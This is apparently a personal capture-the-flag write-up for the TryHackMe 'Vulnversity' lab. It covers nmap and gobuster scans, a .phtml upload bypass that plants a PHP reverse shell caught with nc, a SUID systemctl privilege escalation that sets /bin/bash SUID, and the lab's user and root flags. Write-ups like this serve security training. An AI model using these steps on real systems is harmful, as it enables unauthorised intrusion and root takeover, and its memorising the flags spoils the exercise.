# Vulnversity

```bash
export IP=10.10.117.102
```

## Scans

### Nmap

Command:
```bash
nmap -sC -sV -oN nmap/initial $IP
```

Open Ports Found:
```
21 -- ftp
22 -- ssh
139 -- samba
445 -- samba
3128 -- http-proxy squid 3.5.12
3333 -- webserver
```

### Gobuster

Directories Found:
```
/images -- nothing useful
/css
/js
/fonts
/internal -- upload page
```

## Upload Page Exploit

`.php` not allowed but `.phtml` is allowed

A reverse shell .php can be downloaded from the [PentestMonkey Github](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

don't forget to change IP to host `tun0 ip` and new port

rename `php-reverse-shell.php` to `revshell.phtml` and upload it

setup NetCat listening port:
```bash
nc -lnvp 9001
```

visit `http:10.10.117.103:3333/internal/uploads/revshell.phtml`

Reverse shell achieved

**User Name Found**: `bill`

**User Flag Found**: `8bd7992fbe8a6ad22a63361004cfcedb`


## PrivEsc

Command: to look for SUID privilege
```bash
find / -user root -perm -4000 -exec ls -ldb {} \;
```

or

```bash
find / -perm -400 2>/dev/null
```

shows `/bin/systemctl`, which isn't normal

searching for `systemctl` on [gtfoBins](https://gtfobins.github.io/gtfobins/systemctl/)

and modifying it to be:
```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

this command gives `/bin/bash` elevated privilege

now, running:
```bash
bash -p
```

gives us a root shell

**Root Flag Found**: `a58ff8579f0a9270368d33a9966c7fd5`


---
[back to TryHackMe main page](thm.md)

[back to Index/Table of Contents](index.md)
